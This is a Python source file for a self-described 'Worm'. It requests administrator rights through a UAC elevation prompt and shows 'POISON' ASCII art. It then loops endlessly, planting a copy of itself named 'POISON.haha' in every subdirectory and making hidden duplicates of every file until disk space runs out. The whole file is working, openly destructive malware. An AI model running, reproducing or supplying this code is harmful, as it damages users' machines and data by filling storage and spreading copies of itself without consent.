import os
import shutil
import time
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    #gimme admin hoe
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    exit()

class Worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if path is None:
            self.path = "/"
        else:
            self.path = path

        if target_dir_list is None:
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list

        if iteration is None:
            self.iteration = 2
        else:
            self.iteration = iteration

        self.own_path = os.path.realpath(__file__)
        self.ascii_art = '''
        :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
 __
                              XX
_________        ______       ~~     _______         ______      ___.    ___.
XXXXXXXXX.     ,gXXXXXX.      XX    ,XXXXXXXs      ,gXXXXXX.     XXXi    XXX
XXXXXXXXXX.  ,dXXXXXXXXXs     XX   iXXXXXXXXXi    iXXXXXXXXXX_   XXXb    XXX
XXX~~~XXXXX  XXXXX~ ~~XXXX.   XX  XXXX~   XXXX   iXXXX~`'~XXXXi  XXXXs   XXX
XXX    dXXX  XXX       XXXX   XX  XXXXXs_  '~~   XXX`      XXXX  XXXXXb !XXX
XXX___XXXXX iXXX!       XXX   XX   XXXXXXXXXs   iXXX        XXX  XXX XXi XXX
XXXXXXXXXX`  XXX.       XXX   XX    ~XXXXXXXXX   XXX        XXX  XXX'XXX XXX
XXXXXXXXX`   XXX       XXXX   XX  ____ '~XXXXXb  XXX       XXXX  XXX !XXbXXX
XXX          XXXb     gXXX!   XX  XXXX      XXX  XXXb     gXXX   XXX  'XXXXX
XXX          XXXXXXXXXXXXf    XX  ~XXXXX_gXXXX!  'XXXXXXXXXXXX`  XXX   !XXXX
XXX           ~XXXXXXXXX`     XX    XXXXXXXXX~    'XXXXXXXXX`    XXX    XXXX
~~~              ~~X~~`      '~~`     XXXXX~         ~~X~~`      ~~~    '~~~`
                   ~                  ~~~~~            ~
  __________________________________________________________________________
        '''

    def display_ascii_art(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(self.ascii_art)
        time.sleep(5)

    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            if not file.startswith('.'):
                absolute_path = os.path.join(path, file)
                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)

    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, "POISON.haha")
            shutil.copyfile(self.own_path, destination)

    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory, ("."+file+str(i)))
                        shutil.copyfile(source, destination)

    def start_worm_actions(self):
        while True:
            self.display_ascii_art()
            self.list_directories(self.path)
            self.create_new_worm()
            self.copy_existing_files()
            time.sleep(2)

if __name__ == "__main__":
    current_directory = os.path.abspath("")
    worm = Worm(path=current_directory)
    worm.start_worm_actions()     